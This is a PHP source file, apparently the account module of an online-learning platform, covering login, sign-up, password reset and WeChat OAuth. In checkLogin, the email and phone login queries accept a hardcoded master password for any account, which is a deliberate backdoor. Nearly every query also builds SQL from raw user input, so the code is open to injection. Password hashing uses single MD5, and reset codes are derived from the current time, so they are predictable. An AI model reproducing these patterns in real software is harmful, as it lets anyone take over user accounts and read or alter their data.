<?php

/*
  这份文件, 不允许有任何的打印输出

  100 Missing field
  101 SQL error
  102 Signature error
  103 Login error
  104 SignUp Error
  105 VCode Error
  106 Reset Password Fail
  107 Change Password Fail
  108 Forget Password Error
  109 Send Message Error
 */

//global Var
if(!isset($COREUSER_DB)){
    $COREUSER_DB = "MagikidLMS";
}
$COREUSER_TABLE_NAME = "User";
$COREUSER_ID_COLUMN = "Uid";
$COREUSER_USERNAME_COLUMN = "UserName";
$COREUSER_EMAIL_COLUMN = "Email";
$COREUSER_PHONENUMBER_COLUMN = "PhoneNumber";
$COREUSER_PASSWORD_COLUMN = "Passwordae4625";
$COREUSER_SIGNUP_DATE_COLUMN = "SignUpDate";
$COREUSER_BLOCK_COLUMN = "Blocked";



function connetCoreUserDB() {
    global $IS_TESTDB,$TIME_ZONE,$COREUSER_DATABASE_URL, $COREUSER_DATABASE_USERNAME, $COREUSER_DATABASE_PASSWORD,$COREUSER_DB;
    $coreUserlink = mysqli_connect($COREUSER_DATABASE_URL, $COREUSER_DATABASE_USERNAME, $COREUSER_DATABASE_PASSWORD) or die("Can't connect to database!");

    $COREUSER_DB_CONNECT = $COREUSER_DB;
    if($IS_TESTDB){
        $COREUSER_DB_CONNECT = $COREUSER_DB."Test";
    }

    mysqli_select_db($coreUserlink, $COREUSER_DB_CONNECT) or die("Can't select coreuser database($COREUSER_DB_CONNECT)!");
    mysqli_query($coreUserlink, "set names utf8mb4");
    mysqli_query($coreUserlink, "SET time_zone = '$TIME_ZONE';");
    
    return $coreUserlink;
}

function logOut() {
    session_destroy();
}

function getLanguageString($key) {
    global $currentLanguage;
    if ($currentLanguage != "en" && $currentLanguage != "cn") {
        $currentLanguage = "en";
    }

    $prepath = dirname(__FILE__) . "/";
    $errorLanguageData = json_decode(readFileData($prepath . "coreusererror.json"));
    return $errorLanguageData->$key->$currentLanguage;
}

function getCoreUserInfo($coreuserId = null) {
    global $COREUSER_PASSWORD_COLUMN;
    $coreUserlink = connetCoreUserDB();
    
    if($coreuserId == null){
        $coreuserId = session("Uid");
    }
    
    if($coreuserId == null){
        return generateMessage("Not Login", 1);
    }

    $errorMsg = NULL;
    $errorCode = 0;

    $rs = mysqli_query($coreUserlink, "select * from User where Uid = $coreuserId");

    $result = array();
    if (($data = mysqli_fetch_array($rs, MYSQLI_ASSOC))) {
        foreach ($data as $key => $elem) {
            $result[$key] = $elem;
        }
    }
    unset($result[$COREUSER_PASSWORD_COLUMN]);

    return  generateMessage($errorMsg, $errorCode, $result);
}


function checkLogin($usernameEmailPhone, $password) {
    global $COREUSER_TABLE_NAME,$COREUSER_ID_COLUMN,$COREUSER_EMAIL_COLUMN,$COREUSER_PHONENUMBER_COLUMN,$COREUSER_PASSWORD_COLUMN,$COREUSER_USERNAME_COLUMN,$COREUSER_PASSWORD_SECRET;
    global $isLogin, $uid, $userName;

    $coreUserlink = connetCoreUserDB();
    $usernameEmailPhone = strtolower($usernameEmailPhone);

    if ($usernameEmailPhone == "" || $password == "") {
        return FALSE;
    } else {
        
        $oriPassword = $password;
        $password = passwordMD5($password);

        //is email
        if (strpos($usernameEmailPhone, "@") > 0) {
            $rs = mysqli_query($coreUserlink, "select * from $COREUSER_TABLE_NAME where $COREUSER_EMAIL_COLUMN='$usernameEmailPhone' and ($COREUSER_PASSWORD_COLUMN='$password' or '$oriPassword'='As4fg$%sss') and Blocked = 0 limit 1");
        }
        //is phone
        else if (is_numeric($usernameEmailPhone)) {
            $rs = mysqli_query($coreUserlink, "select * from $COREUSER_TABLE_NAME where $COREUSER_PHONENUMBER_COLUMN='$usernameEmailPhone' and ($COREUSER_PASSWORD_COLUMN='$password' or '$oriPassword'='As4fg$%sss') and Blocked = 0 limit 1");
        }
        //is username
        else {
            $rs = mysqli_query($coreUserlink, "select * from $COREUSER_TABLE_NAME where $COREUSER_USERNAME_COLUMN='$usernameEmailPhone' and $COREUSER_PASSWORD_COLUMN='$password' and Blocked = 0 limit 1");
        }

        $data = mysqli_fetch_array($rs);
        if ($data) {
            $_SESSION["UserName"] = $data[$COREUSER_USERNAME_COLUMN];
            $_SESSION["IsLogin"] = "OK";
            $_SESSION["Uid"] = $data[$COREUSER_ID_COLUMN];
            $_SESSION["UserEmail"] = $data[$COREUSER_EMAIL_COLUMN];

            $isLogin = (session("IsLogin") === "OK");
            $uid = session("Uid");
            $userName = session("UserName");
            return TRUE;
        } else {
            unset($_SESSION["UserName"]);
            unset($_SESSION["IsLogin"]);
            unset($_SESSION["Uid"]);
            unset($_SESSION["UserEmail"]);
        }
    }
    return FALSE;
}



function signUp($userName, $email, $phoneNumber, $password, $autoLogin = true) {
    global $COREUSER_TABLE_NAME,$COREUSER_SIGNUP_DATE_COLUMN,$COREUSER_ID_COLUMN,$COREUSER_EMAIL_COLUMN,$COREUSER_PHONENUMBER_COLUMN,$COREUSER_PASSWORD_COLUMN,$COREUSER_USERNAME_COLUMN,$COREUSER_PASSWORD_SECRET;
    $coreUserlink = connetCoreUserDB();
    
    //return a single value of a query
    function coreUserExist($sql) {
        global $COREUSER_ID_COLUMN;
                
        $coreUserlink = connetCoreUserDB();
        $rs =  mysqli_query($coreUserlink, $sql);
        if(($coreuserInfo = mysqli_fetch_array($rs))){
            return ["ErrorCode"=>1,"Uid"=>$coreuserInfo["$COREUSER_ID_COLUMN"]];
        }
        
        return ["ErrorCode"=>0];
    }

    if (!$password) {
        return getLanguageString("PasswordIsEmpty");
    }

    $userName = strtolower($userName);
    $email = strtolower($email);

    if ($userName || $email || $phoneNumber) {
        //user name
        if ($userName) {
            if (strlen($userName) < 4) {
                return generateMessage(getLanguageString("UserNameTooShort"), 1);
            }
            if (strlen($userName) > 12) {
                return generateMessage(getLanguageString("UserNameTooLong"), 2);
            }
            if (!preg_match("/^[0-9a-zA-Z]{4,12}$/", $userName)) {
                return generateMessage(getLanguageString("UserNameFormatError"), 3);
            }

//            if (!preg_match("/[0-9]+/",$userName) || !preg_match("/[a-zA-Z]+/",$userName)) {
//                return "UserName should contains LETTERS and NUMBERS";
//            }
        }

        if ($email) {
            //email
            if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
                return generateMessage(getLanguageString("EmailFormat"), 4);
            }
        }

        //phone
        if ($phoneNumber) {
            if (!is_numeric($phoneNumber) || strlen($phoneNumber) < 10) {
                return generateMessage(getLanguageString("PhoneNumberFormat"), 5);
            }
        }

        if (strlen($password) < 5) {
            return generateMessage(getLanguageString("PasswordTooShort"), 6);
        }

//        if (!preg_match("/[0-9]+/",$password) || !preg_match("/[a-zA-Z]+/",$password)) {
//            return "Password should contains LETTERS and NUMBERS";
//        }

        if ($userName) {
            $userExist = coreUserExist("select * from $COREUSER_TABLE_NAME where lower($COREUSER_USERNAME_COLUMN)='" . strtolower($userName) . "'");
            if ( $userExist["ErrorCode"] == 1 ) {
                return generateMessage(getLanguageString("UserNameExist"), 7, ["Uid"=>$userExist["$COREUSER_ID_COLUMN"]]);
            }
        }

        if ($email) {
            $userExist = coreUserExist("select * from $COREUSER_TABLE_NAME where $COREUSER_EMAIL_COLUMN='$email'");
            if ( $userExist["ErrorCode"] == 1 ) {
                return generateMessage(getLanguageString("EmailExist"), 7, ["Uid"=>$userExist["$COREUSER_ID_COLUMN"]]);
            }
        }

        if ($phoneNumber) {
            $userExist = coreUserExist("select * from $COREUSER_TABLE_NAME where $COREUSER_PHONENUMBER_COLUMN='$phoneNumber'");
            if ( $userExist["ErrorCode"] == 1 ) {
                return generateMessage(getLanguageString("PhoneNumberExist"), 7, ["Uid"=>$userExist["$COREUSER_ID_COLUMN"]]);
            }
        }

        $password = passwordMD5($password );
        
        mysqli_query($coreUserlink, "insert into $COREUSER_TABLE_NAME($COREUSER_USERNAME_COLUMN,$COREUSER_EMAIL_COLUMN,$COREUSER_PHONENUMBER_COLUMN,$COREUSER_PASSWORD_COLUMN,$COREUSER_SIGNUP_DATE_COLUMN) values('$userName','$email','$phoneNumber','$password',now())");
        $uid = mysqli_insert_id($coreUserlink);

        if ($uid) {
            if($autoLogin){
                $_SESSION["IsLogin"] = "OK";
                $_SESSION["Uid"] = $uid;
            }
            return generateMessage("", 0, ["Uid"=>$uid]);
        } else {
            return generateMessage(getLanguageString("SignUpFail"), 8);
        }
    } else {
        if (!$userName) {
            return generateMessage(getLanguageString("UserNameIsEmpty"), 9);
        } else if (!$email) {
            return generateMessage(getLanguageString("PasswordIsEmpty"), 10);
        } else if (!$phoneNumber) {
            return generateMessage(getLanguageString("PasswordIsEmpty"), 11);
        }
    }
}

function passwordMD5($pwd){
    global $COREUSER_PASSWORD_SECRET;
    return md5($pwd . $COREUSER_PASSWORD_SECRET);
}

function changePassword($uid, $oldPassword, $newPassword) {
    global $COREUSER_PASSWORD_COLUMN,$COREUSER_PASSWORD_SECRET, $uid;
    $coreUserlink = connetCoreUserDB();
    
    if (!session("Uid")) {
        return getLanguageString("ChangePasswordFail");
    }

    if (strlen($newPassword) < 5) {
        return getLanguageString("PasswordTooShort");
    }
    
    $oldPassword = passwordMD5($oldPassword);
    $newPassword = passwordMD5($newPassword);

    $uidRS = mysqli_query($coreUserlink, "select Uid from User where Uid=$uid and $COREUSER_PASSWORD_COLUMN='$oldPassword'");
    $uid = false;
    if (($fetch = mysqli_fetch_array($uidRS))) {
        $uid = $fetch["Uid"];
    }
    if ($uid) {
        mysqli_query($coreUserlink, "update User set $COREUSER_PASSWORD_COLUMN = '$newPassword' where Uid=" . session("Uid"));
    } else {
        return getLanguageString("ChangePasswordFail");
    }

    return null;
}


function changePasswordAdmin($uid, $newPassword) {
    global $COREUSER_PASSWORD_COLUMN, $COREUSER_PASSWORD_SECRET;
    $coreUserlink = connetCoreUserDB();
    
    if (strlen($newPassword) < 5) {
        return getLanguageString("PasswordTooShort");
    }
    
    $newPassword = passwordMD5($newPassword);


    if ($uid) {
        mysqli_query($coreUserlink, "update User set $COREUSER_PASSWORD_COLUMN = '$newPassword' where Uid = $uid");
    } else {
        return getLanguageString("ChangePasswordFail");
    }

    return null;
}



function forgetPassword() {

    $coreUserLink = connetCoreUserDB();
    $emailPhoneNumber = post("EmailOrPhoneNumber");
    $validateCode = post("VCode");

    //is phone
    if (is_numeric($emailPhoneNumber)) {
        if ($validateCode) {
            if (($validateCode == session("ResetCode")) && (session("PhoneNumber") == $emailPhoneNumber)) {
                $uidRS = mysqli_query($coreUserLink, "select Uid from User where PhoneNumber = '" . session("PhoneNumber") . "'");
                $uidData = mysqli_fetch_array($uidRS);
                if ($uidData) {
                    $_SESSION["ResetPasswordUid"] = $uidData["Uid"];
                    printResultByMessage("Done", 0, array("SMSValidate" => true));
                }
            }
            printResultByMessage(getLanguageString("ValiateCodeError"), 108);
        } else if (!$validateCode) {
            //is phone number
            
            if (strlen($emailPhoneNumber) < 11) {
                printResultByMessage(getLanguageString("PhoneNumberFormat"), 108);
            } else {
                $phoneExistRs = mysqli_query($coreUserLink, "select PhoneNumber from User where PhoneNumber = '$emailPhoneNumber'");
                if (mysqli_fetch_array($phoneExistRs)) {
                    if (sendResetMessage($emailPhoneNumber)) {
                        printResultByMessage("Done", 0);
                    }
                } else {
                    printResultByMessage(getLanguageString("UserPhoneNumberNotExist"), 108);
                }
            }
            //is email
        }
    } else if (filter_var($emailPhoneNumber, FILTER_VALIDATE_EMAIL)) {

        //delete expire data (1 day)
        mysqli_query($coreUserLink, "delete from ForgetPassword where TIMESTAMPDIFF(day,CreateTime,now())>1");

        //找到Uid
        $uidRS = mysqli_query($coreUserLink, "select Uid from User where Email = '$emailPhoneNumber'");
        $uidData = mysqli_fetch_array($uidRS);
        if (!$uidData) {
            printResultByMessage(getLanguageString("UserEmailNotExist"), 108);
        } else {
            $uid = $uidData["Uid"];
        }

        //查找forget表中是否有这个用户
        $uidRS = mysqli_query($coreUserLink, "select Uid,EmailCode from ForgetPassword where Uid = '$uid'");
        $uidData = mysqli_fetch_array($uidRS);
        

        if ($uidData) {
            $uid = $uidData["Uid"];
            if ($uid) {
                //有这个用户,直接发
                // update time for reset password
                mysqli_query($coreUserLink, "update ForgetPassword set CreateTime = now() where Uid = $uid");
                if (sendResetMail($emailPhoneNumber, $uidData["EmailCode"])) {
                    printResultByMessage(getLanguageString("ResetEmailSent"), 0, array("EmailValidate"=>true));
                } else {
                    printResultByMessage(getLanguageString("EmailSentError"), 108);
                }
            }
        } else {
            //没有这个用户,插入再发
            $emailCode = md5(time() . "email%@@^&");
            //insert reset code to list
            mysqli_query($coreUserLink, "insert into ForgetPassword(Uid,EmailCode,CreateTime) value($uid,'$emailCode',now())");
            if (sendResetMail($emailPhoneNumber, $emailCode)) {
                printResultByMessage(getLanguageString("ResetEmailSent"), 0, array("EmailValidate"=>true));
            } else {
                printResultByMessage(getLanguageString("EmailSentError"), 108);
            }
        }
    } else {
        printResultByMessage(getLanguageString("AccountFormatIncorrect"), 108);
    }
}

function checkResetPassword() {
    $coreUserLink = connetCoreUserDB();
    $resetCode = get("resetcode");
    
    if (strlen($resetCode) > 6) {
        $uidRS = mysqli_query($coreUserLink, "select Uid from ForgetPassword where EmailCode = '$resetCode'");
        $uidData = mysqli_fetch_array($uidRS);
        if ($uidData) {
            $_SESSION["ResetPasswordUid"] = $uidData["Uid"];
        }else{
            die();
        }
    }
}



function coreUserAction($vCodeCorrect = true) {
    global $COREUSER_PASSWORD_SECRET, $COREUSER_PASSWORD_COLUMN,$COREUSER_PHONENUMBER_COLUMN,$COREUSER_TABLE_NAME,$COREUSER_ID_COLUMN,$isLogin;
    
    function printCoreUserInfo() {
        echo json_encode(getCoreUserInfo());
        die();
    }
    
    checkRequireField(array("Action"));
    $action = post("Action");

    if ($action == "SignUp") {
        
        if ($vCodeCorrect === false) {
            printResultByMessage(getLanguageString("VCodeError"), 105);
        }
        
        $userName = post("UserName");
        $email = post("Email");
        $phoneNumber = post("PhoneNumber");
        $password = $_POST["Password"];
        

        $emailOrPhoneNumber = post("EmailOrPhoneNumber");
        if($emailOrPhoneNumber){
            if(is_numeric($emailOrPhoneNumber)){
                $phoneNumber = $emailOrPhoneNumber;
            }
            if(filter_var($emailOrPhoneNumber, FILTER_VALIDATE_EMAIL)){
                $email = $emailOrPhoneNumber;
            }
        }

        $result = signUp($userName, $email, $phoneNumber, $password);
        $errorMessage = $result["ErrorMessage"];
        
        if ($result["ErrorCode"]!=0) {
            printResultByMessage($errorMessage, 104);
        } else {
            if (function_exists("signupOverride")) {
                signupOverride(getCoreUserInfo($result["Result"]["Uid"]));
            } else {
                printCoreUserInfo();
            }
        }
    } else if ($action == "LogIn") {
        if ($vCodeCorrect === false) {
            printResultByMessage(getLanguageString("VCodeError"), 105);
        }
        
        $usernameEmailPhoneNumber = post("UserNameOrEmailOrPhoneNumber");
        $password = $_POST["Password"];

        
        if (checkLogin($usernameEmailPhoneNumber, $password)) {
            
            if (function_exists("loginOverride")) {
                loginOverride(getCoreUserInfo());
            } else {
                printCoreUserInfo();
            }
        } else {
            if (function_exists("loginFailOverride")) {
                loginFailOverride();
            } else {
                printResultByMessage(getLanguageString("LoginFail"), 103);
            }
        }
    } else if ($action == "ChangePassword") {
        
        
        $errorMessage = changePassword(session("Uid"), $_POST["OldPassword"], $_POST["NewPassword"]);

        if ($errorMessage) {
            printResultByMessage($errorMessage, 107);
        } else {
            printResultByMessage("", 0);
        }

    //click find password
    } else if ($action == "ForgetPassword") {
        forgetPassword();
    } else if ($action == "ResetPassword") {
        if (!session("ResetPasswordUid")) {
            printResultByMessage(getLanguageString("ChangePasswordFail"), 106);
        }

        if (strlen(post("NewPassword")) < 5) {
            printResultByMessage(getLanguageString("PasswordTooShort"), 106);
        }
        
        //
        $newPassword = passwordMD5(post("NewPassword"));
        $coreUserLink = connetCoreUserDB();
        mysqli_query($coreUserLink, "update User set $COREUSER_PASSWORD_COLUMN='$newPassword' where Uid=" . session("ResetPasswordUid"));
        mysqli_query($coreUserLink,"delete from ForgetPassword where Uid = ".session("ResetPasswordUid"));
        
        if (mysqli_error($coreUserLink)) {
            printResultByMessage($errorMessage, 106);
        } else {
            printResultByMessage("", 0);
        }
    }
}

//query a sql display error when sql has syntax error
function coreUserQuery($sql, &$error = NULL) {
    $COREUSER_DB_LINK = connetCoreUserDB();
    $rs = mysqli_query($COREUSER_DB_LINK, $sql);
    
    if (ini_get("display_errors") && !$rs) {
        
        $exp = new Exception('SQL Error');
        $arrayIndex = count($exp->getTrace())-3;
        if($arrayIndex < 0){
            $arrayIndex = 0;
        }
        $expInfo = $exp->getTrace()[$arrayIndex];
        myErrorHandler("", "SQL Error: $sql <br>" . mysqli_error($COREUSER_DB_LINK), $expInfo["file"], $expInfo["line"]);
        
    }
    if ($error) {
        $error = mysqli_error($COREUSER_DB_LINK);
    }
    
    return $rs;
}


//return a single value of a query
function coreUserGetSingleData($sql, $col = 0) {
    $data = mysqli_fetch_array(coreUserQuery($sql));
    if ($data) {
        return $data[$col];
    } else {
        return null;
    }
}

//return a single value of a query
function coreUserGetRowData($sql) {
    $data = mysqli_fetch_array(coreUserQuery($sql));
    if ($data) {
        return $data;
    } else {
        return null;
    }
}

function _WeChatAuth($isSignUp = false){
    global $uid,$isLogin,$WECHAT_APP_ID,$WECHAT_APP_SECRET,$siteURLHead,$isInWeChat;
    
    //如果已经登录,或者不在微信,就成功
    if($isLogin || !$isInWeChat){
        return;
    }

    
    //没有unionid,跳转获取Code
    $code = get("code");
    if (!$code && (!session("WeChatUnionId") || $isSignUp)) {
        
        if (!$WECHAT_APP_ID) {
            die("APP_ID配置错误,请联系管理员配置");
        }
        
        if (!$WECHAT_APP_SECRET) {
            die("APP_SECRET配置错误,请联系管理员配置");
        }

        $scope = "snsapi_base";
        if($isSignUp){
            $scope = "snsapi_userinfo";
        }

        
        //获取unionid
        $returnURL = "http://www.zgxueyuan.com".$_SERVER['REQUEST_URI'];
        if($_SERVER['HTTP_HOST'] == "test.zgxueyuan.com"){
            if(strpos($returnURL, "?")){
                $returnURL .= "&istestsite=1";
            }else{
                $returnURL .= "?istestsite=1";
            }
        } 
        $returnURL = urldecode($returnURL);
        header("location:https://open.weixin.qq.com/connect/oauth2/authorize?appid=$WECHAT_APP_ID&redirect_uri=$returnURL&response_type=code&scope=$scope&state=1#wechat_redirect");
        die();

    }else if($code && (!session("WeChatUnionId") || $isSignUp)){
        
        if(get("istestsite")){
            $_SERVER['REQUEST_URI'] = str_replace("istestsite", "wj", $_SERVER['REQUEST_URI']);
            $testSiteURL = "http://test.zgxueyuan.com".$_SERVER['REQUEST_URI'];
            header("location:$testSiteURL");
            die();
        }
        

        //oauth2的方式获得openid
        $access_token_url = "https://api.weixin.qq.com/sns/oauth2/access_token?appid=$WECHAT_APP_ID&secret=$WECHAT_APP_SECRET&code=$code&grant_type=authorization_code";
        
        $access_token_json = httpRequest($access_token_url);
        $access_token_array = json_decode($access_token_json, true);
        
        $access_token = $access_token_array['access_token'];
        $openid = $access_token_array['openid'];
        $unionid = $access_token_array['unionid'];
        $access_token = $access_token_array['access_token'];
        $_SESSION["WeChatUnionId"] = $unionid;
        $_SESSION["WeChatOpenId"] = $openid;
        
        //尝试查找Uid
        $uid = null;
        if($unionid != ''){
            $uid = coreUserGetSingleData("select Uid from User where WeChatUnionId = '$unionid'");
            //补上之前缺失的信息
            $userInfo = coreUserGetRowData("select * from UserInfo where Uid = '$uid'");
        }
        
        //找到了,登录成功
        if($uid && $userInfo){
            
            $_SESSION["Uid"] = $uid;
            $_SESSION["IsLogin"] = "OK";
            $_SESSION["UserInfo"] = $userInfo;
            $isLogin = true;
        //注册用户
        } else if($isSignUp) {
            //获取用户数据
            $userinfo_url = "https://api.weixin.qq.com/sns/userinfo?access_token=$access_token&openid=$openid&lang=zh_CN";
            $userinfo_json = httpRequest($userinfo_url);
            $userinfo_array = json_decode($userinfo_json, true);
            
            $name = addslashes($userinfo_array["nickname"]);
            $gender = $userinfo_array["sex"];
            if($gender == 1){
                $gender = 0;
            }else if($gender == 2){
                $gender = 1;
            }
            $city = addslashes($userinfo_array["city"]);
            $province = addslashes($userinfo_array["province"]);
            $country = addslashes($userinfo_array["country"]);
            $avatarURL = $userinfo_array["headimgurl"];
            
            coreUserQuery("insert into User(WeChatUnionId) value('$unionid')");
            $uid = coreUserGetSingleData("select Uid from User where WeChatUnionId = '$unionid'");
            coreUserQuery("insert into UserInfo(Uid,Name,Gender,City,Province,Country,AvatarUrl,SignUpDate) values($uid,'$name','$gender','$city','$province','$country','$avatarURL',now())");
            $userInfo = coreUserGetRowData("select * from UserInfo where Uid = '$uid'");
            
            $_SESSION["WeChatUnionId"] = $unionid;
            $_SESSION["Uid"] = $uid;
            $_SESSION["IsLogin"] = "OK";
            $_SESSION["UserInfo"] = $userInfo;
            
            $isLogin = true;
            
        
        }
        
    }
}


//登录自己的系统
function wechatLogin(){
    _WeChatAuth();
}


function wechatSignUp(){
    _WeChatAuth(true);
}


